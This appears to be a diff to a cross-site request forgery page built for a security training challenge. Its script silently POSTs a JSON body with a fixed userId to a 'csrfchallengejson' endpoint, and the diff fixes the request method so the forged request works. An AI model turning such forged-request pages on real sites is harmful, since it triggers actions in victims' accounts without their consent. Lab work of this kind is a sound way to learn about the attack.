@@ -11,16 +11,18 @@
     var userId = "398a2626d934ee0e28e46e4c5d5c1cab10e1a9b8";
     var jsonD = JSON.stringify({userId:userId});
     fetch('https://shepherd.websec.dedyn.io/user/csrfchallengejson/plusplus', {
-      method: POST,
+      method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
       body: jsonD
     })
+    .then(response => response.json())
   };
 </script>
 </body>
 </html>
+
 
 
 
